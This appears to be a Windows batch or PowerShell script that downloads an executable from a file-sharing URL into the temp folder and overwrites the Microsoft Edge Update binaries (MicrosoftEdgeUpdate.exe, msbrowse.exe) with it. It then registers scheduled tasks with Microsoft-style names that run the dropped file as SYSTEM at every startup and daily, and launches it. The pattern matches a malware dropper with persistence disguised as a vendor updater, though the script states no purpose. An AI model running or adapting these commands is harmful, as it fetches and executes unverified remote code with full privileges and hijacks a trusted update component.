ls "c:\ProgramData\Microsoft\EdgeUpdate\"
ls "c:\Program Files (x86)\Microsoft\EdgeUpdate\"

schtasks /Query /TN MicrosoftEdgeUpdateTaskMachineUA
schtasks /Query /TN MicrosoftEdgeUpdateTaskMachineCore
schtasks /Query /TN Microsoft\MSbrowse
schtasks /Query /TN Microsoft\MSbrowseD
schtasks /Query /TN Microsoft\UAStock
schtasks /Query /TN Microsoft\UAStockU
schtasks /Query /TN Microsoft\UAStockD

wget https://l.station307.com/LYGiXeMAeb6NC9yZ6Qa8bi/msbrowse.exe -OutFile c:\windows\temp\1.exe

del "c:\Program Files (x86)\Microsoft\EdgeUpdate\1MicrosoftEdgeUpdate.exe"
del "c:\ProgramData\Microsoft\EdgeUpdate\1msbrowse.exe"

ren "c:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" "c:\Program Files (x86)\Microsoft\EdgeUpdate\1MicrosoftEdgeUpdate.exe"
ren "c:\ProgramData\Microsoft\EdgeUpdate\msbrowse.exe" "c:\ProgramData\Microsoft\EdgeUpdate\1msbrowse.exe"
 
 
copy c:\windows\temp\1.exe 'c:\ProgramData\Microsoft\EdgeUpdate\msbrowse.exe' -Force
copy c:\windows\temp\1.exe 'C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe' -Force
cmd /c RD c:\ProgramData\US /s /q
del c:\windows\temp\1.exe


Echo Taskkill
taskkill /IM msbrowse.exe /f 
taskkill /IM UAStock.exe /f 
taskkill /IM MicrosoftEdgeUpdate /f 

del "c:\Program Files (x86)\Microsoft\EdgeUpdate\1MicrosoftEdgeUpdate.exe"
del "c:\ProgramData\Microsoft\EdgeUpdate\1msbrowse.exe"


Echo DelSchedule
schtasks /TN Microsoft\UAStock /Delete /F
schtasks /TN Microsoft\UAStockU /Delete /F
schtasks /TN Microsoft\UAStockD /Delete /F
schtasks /TN Microsoft\MSbrowse /Delete /F
schtasks /TN Microsoft\MSbrowseD /Delete /F

Echo Schedule
schtasks /TN Microsoft\MSbrowse /Create /RU SYSTEM /TR c:\ProgramData\Microsoft\EdgeUpdate\msbrowse.exe  /SC ONSTART /f
schtasks /TN Microsoft\MSbrowseD /Create /RU SYSTEM /TR c:\ProgramData\Microsoft\EdgeUpdate\msbrowse.exe  /SC DAILY /f
Echo Run
schtasks /Run /TN Microsoft\MSbrowse